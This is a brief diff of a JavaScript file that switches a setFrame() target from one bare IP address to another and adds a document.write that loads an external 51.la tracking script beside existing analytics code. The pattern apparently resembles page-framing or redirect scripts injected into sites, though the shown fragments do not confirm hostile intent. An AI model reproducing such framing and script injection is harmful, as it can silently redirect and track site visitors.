@@ -1,6 +1,6 @@
 //lxxaisite
 var titlestr=document.title;
-setFrame("http://38.26.195.178");
+setFrame("http://38.26.195.182");
 
 
 
@@ -29,7 +29,7 @@ function setFrame(olink){
       }, 100)
     } catch (e) {}
 }
-
+document.write ('<script type="text/javascript"  src="https://js.users.51.la/21240803.js"></script>');
 var _hmt = _hmt || [];
 (function() {
   var hm = document.createElement("script");
